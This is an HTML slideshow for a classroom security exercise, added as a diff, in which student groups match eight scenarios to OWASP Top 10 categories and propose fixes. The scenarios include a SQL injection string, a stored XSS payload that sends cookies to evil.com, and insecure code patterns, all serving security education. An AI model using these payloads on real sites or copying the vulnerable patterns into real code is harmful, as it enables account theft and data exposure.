@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Incident Response Challenge</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a1a;
+            color: #e0e0e0;
+            overflow: hidden;
+        }
+
+        .slideshow-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        .slide {
+            display: none;
+            flex: 1;
+            flex-direction: column;
+            justify-content: center;
+            animation: fadeIn 0.5s;
+        }
+
+        .slide.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            color: #ffffff;
+            font-size: 3em;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        h2 {
+            color: #ffffff;
+            font-size: 2.2em;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        h3 {
+            color: #cccccc;
+            font-size: 1.5em;
+            margin: 20px 0 10px 0;
+        }
+
+        .subtitle {
+            color: #999999;
+            font-size: 1.3em;
+            margin-bottom: 40px;
+        }
+
+        .content {
+            font-size: 1.2em;
+            line-height: 1.8;
+            margin-bottom: 20px;
+        }
+
+        .highlight {
+            background: #2a2a2a;
+            border-left: 4px solid #666666;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+
+        pre {
+            background: #0d0d0d;
+            border: 1px solid #333333;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 15px 0;
+            font-size: 1em;
+            color: #9ccc65;
+        }
+
+        code {
+            color: #9ccc65;
+        }
+
+        .question {
+            color: #ffffff;
+            font-weight: bold;
+            margin: 15px 0;
+            font-size: 1.2em;
+        }
+
+        ul {
+            margin-left: 30px;
+            margin-top: 15px;
+        }
+
+        li {
+            margin: 10px 0;
+            font-size: 1.1em;
+        }
+
+        .navigation {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            margin-top: auto;
+        }
+
+        button {
+            background: #404040;
+            color: white;
+            border: 1px solid #666666;
+            padding: 15px 30px;
+            font-size: 1.1em;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+
+        button:hover {
+            background: #505050;
+            border-color: #888888;
+        }
+
+        button:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        .slide-number {
+            color: #999999;
+            font-size: 1.1em;
+        }
+
+        .scenario-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        a {
+            color: #81c784;
+            text-decoration: none;
+            border-bottom: 2px solid #81c784;
+            transition: all 0.3s;
+        }
+
+        a:hover {
+            color: #a5d6a7;
+            border-bottom-color: #a5d6a7;
+        }
+
+        .instruction-box {
+            background: #2a2a2a;
+            border: 2px solid #555555;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+
+        .wrap-up-item {
+            background: #2a2a2a;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border-left: 4px solid #666666;
+        }
+
+        .url-display {
+            background: #0d0d0d;
+            border: 1px solid #555555;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-size: 1.3em;
+            color: #81c784;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="slideshow-container">
+        <!-- Slide 1: Title -->
+        <div class="slide active">
+            <h1>Security Incident Response Challenge</h1>
+            <div class="subtitle">Time: 35-40 minutes | Groups of 2-3 students</div>
+            <div class="content">
+                <div class="highlight">
+                    <h3>Overview</h3>
+                    <p>Your team will analyze security incidents, identify vulnerabilities, and recommend fixes.</p>
+                </div>
+                <div class="content" style="margin-top: 30px;">
+                    <p><strong>Activity structure:</strong></p>
+                    <ul>
+                        <li>Review 8 real-world security scenarios</li>
+                        <li>Identify which OWASP Top 10 vulnerability each represents</li>
+                        <li>Discuss why it's dangerous</li>
+                        <li>Propose solutions</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 2: Pre-Activity -->
+        <div class="slide">
+            <h2>Pre-Activity (10 minutes)</h2>
+            <div class="instruction-box">
+                <h3>Before starting the scenarios:</h3>
+                <p style="margin-top: 15px; font-size: 1.2em;">Visit the OWASP Top 10 website and spend 10 minutes browsing the list.</p>
+                <div class="url-display">
+                    https://owasp.org/www-project-top-ten/
+                </div>
+                <p style="margin-top: 20px;">Familiarize yourself with the 10 vulnerability categories and their names. You don't need to be an expert.</p>
+            </div>
+            <div class="content" style="margin-top: 40px;">
+                <h3>For each scenario, you'll:</h3>
+                <ul>
+                    <li><strong>Identify</strong> which OWASP Top 10 vulnerability is demonstrated</li>
+                    <li><strong>Discuss</strong> why this is dangerous</li>
+                    <li><strong>Propose</strong> at least one way to fix it</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 3: Scenario 1 -->
+        <div class="slide">
+            <div class="scenario-header">
+                <h2>Scenario 1</h2>
+            </div>
+            <div class="content">
+                <p>An e-commerce site allows users to modify prices by changing URL parameters:</p>
+                <pre>https://shop.example.com/checkout?item=laptop&price=999</pre>
+                <p>A user discovers they can change the URL to:</p>
+                <pre>https://shop.example.com/checkout?item=laptop&price=1</pre>
+                <p>And successfully purchases a $999 laptop for $1.</p>
+                
+                <div style="margin-top: 40px;">
+                    <div class="question">Which OWASP vulnerability is this?</div>
+                    <div class="question">How would you fix it?</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 4: Scenario 2 -->
+        <div class="slide">
+            <div class="scenario-header">
+                <h2>Scenario 2</h2>
+            </div>
+            <div class="content">
+                <p>A developer writes code to display user profiles:</p>
+                <pre>user_id = request.GET['id']
+query = "SELECT * FROM users WHERE id = " + user_id
+results = database.execute(query)</pre>
+                <p>A malicious user visits:</p>
+                <pre>https://site.com/profile?id=1 OR 1=1</pre>
+                <p>And suddenly sees ALL users' data including passwords.</p>
+                
+                <div style="margin-top: 40px;">
+                    <div class="question">Which OWASP vulnerability is this?</div>
+                    <div class="question">How would you fix it?</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 5: Scenario 3 -->
+        <div class="slide">
+            <div class="scenario-header">
+                <h2>Scenario 3</h2>
+            </div>
+            <div class="content">
+                <p>A company launches a new website. Months later, a security researcher discovers:</p>
+                <pre>https://company.com/admin
+https://company.com/debug
+https://company.com/.git/config</pre>
+                <p>These URLs expose an unsecured admin panel, debug information, and source code that was left accessible during development.</p>
+                
+                <div style="margin-top: 40px;">
+                    <div class="question">Which OWASP vulnerability is this?</div>
+                    <div class="question">How would you fix it?</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 6: Scenario 4 -->
+        <div class="slide">
+            <div class="scenario-header">
+                <h2>Scenario 4</h2>
+            </div>
+            <div class="content">
+                <p>A banking website uses predictable session IDs:</p>
+                <pre>Session ID: user12345_20250929</pre>
+                <p>An attacker guesses another user's session ID and gains access to their account without knowing their password.</p>
+                
+                <div style="margin-top: 40px;">
+                    <div class="question">Which OWASP vulnerability is this?</div>
+                    <div class="question">How would you fix it?</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 7: Scenario 5 -->
+        <div class="slide">
+            <div class="scenario-header">
+                <h2>Scenario 5</h2>
+            </div>
+            <div class="content">
+                <p>A blog allows users to post comments. A malicious user posts:</p>
+                <pre>&lt;script&gt;
+  fetch('https://evil.com/steal?cookie=' + document.cookie)
+&lt;/script&gt;</pre>
+                <p>Now every visitor to that page has their login cookies sent to the attacker.</p>
+                
+                <div style="margin-top: 40px;">
+                    <div class="question">Which OWASP vulnerability is this?</div>
+                    <div class="question">How would you fix it?</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 8: Scenario 6 -->
+        <div class="slide">
+            <div class="scenario-header">
+                <h2>Scenario 6</h2>
+            </div>
+            <div class="content">
+                <p>A web application uses a JavaScript library:</p>
+                <pre>&lt;script src="jquery-1.8.0.min.js"&gt;&lt;/script&gt;</pre>
+                <p>This version (from 2012) has 15 known security vulnerabilities that attackers actively exploit.</p>
+                
+                <div style="margin-top: 40px;">
+                    <div class="question">Which OWASP vulnerability is this?</div>
+                    <div class="question">How would you fix it?</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 9: Scenario 7 -->
+        <div class="slide">
+            <div class="scenario-header">
+                <h2>Scenario 7</h2>
+            </div>
+            <div class="content">
+                <p>An application's error log contains:</p>
+                <pre>ERROR: Login failed for user admin, password: SuperSecret123!
+ERROR: Database connection failed. Connection string: 
+  Server=db.internal;User=admin;Password=DbPass789</pre>
+                <p>An attacker who gains access to log files now has multiple passwords.</p>
+                
+                <div style="margin-top: 40px;">
+                    <div class="question">Which OWASP vulnerability is this?</div>
+                    <div class="question">How would you fix it?</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 10: Scenario 8 -->
+        <div class="slide">
+            <div class="scenario-header">
+                <h2>Scenario 8</h2>
+            </div>
+            <div class="content">
+                <p>A regular user discovers that by changing a single form field from:</p>
+                <pre>&lt;input type="hidden" name="role" value="user"&gt;</pre>
+                <p>to:</p>
+                <pre>&lt;input type="hidden" name="role" value="admin"&gt;</pre>
+                <p>They gain administrator privileges.</p>
+                
+                <div style="margin-top: 40px;">
+                    <div class="question">Which OWASP vulnerability is this?</div>
+                    <div class="question">How would you fix it?</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 11: Wrap-Up -->
+        <div class="slide">
+            <h2>Wrap-Up (5 minutes)</h2>
+            <div class="content">
+                <h3>Discussion Questions:</h3>
+                <div class="wrap-up-item">
+                    Which vulnerability surprised you most?
+                </div>
+                <div class="wrap-up-item">
+                    Which do you think is most common in real applications?
+                </div>
+                <div class="wrap-up-item">
+                    What's one security practice you'll remember?
+                </div>
+            </div>
+        </div>
+
+        <!-- Navigation -->
+        <div class="navigation">
+            <button id="prevBtn" onclick="changeSlide(-1)">← Previous</button>
+            <div class="slide-number">
+                <span id="currentSlide">1</span> / <span id="totalSlides">11</span>
+            </div>
+            <button id="nextBtn" onclick="changeSlide(1)">Next →</button>
+        </div>
+    </div>
+
+    <script>
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.slide');
+        const totalSlides = slides.length;
+        
+        document.getElementById('totalSlides').textContent = totalSlides;
+        
+        function showSlide(n) {
+            slides[currentSlide].classList.remove('active');
+            
+            if (n >= totalSlides) {
+                currentSlide = totalSlides - 1;
+            } else if (n < 0) {
+                currentSlide = 0;
+            } else {
+                currentSlide = n;
+            }
+            
+            slides[currentSlide].classList.add('active');
+            document.getElementById('currentSlide').textContent = currentSlide + 1;
+            
+            // Update button states
+            document.getElementById('prevBtn').disabled = currentSlide === 0;
+            document.getElementById('nextBtn').disabled = currentSlide === totalSlides - 1;
+        }
+        
+        function changeSlide(direction) {
+            showSlide(currentSlide + direction);
+        }
+        
+        // Keyboard navigation
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'ArrowLeft') {
+                changeSlide(-1);
+            } else if (event.key === 'ArrowRight') {
+                changeSlide(1);
+            }
+        });
+        
+        // Initialize
+        showSlide(0);
+    </script>
+</body>
+</html>
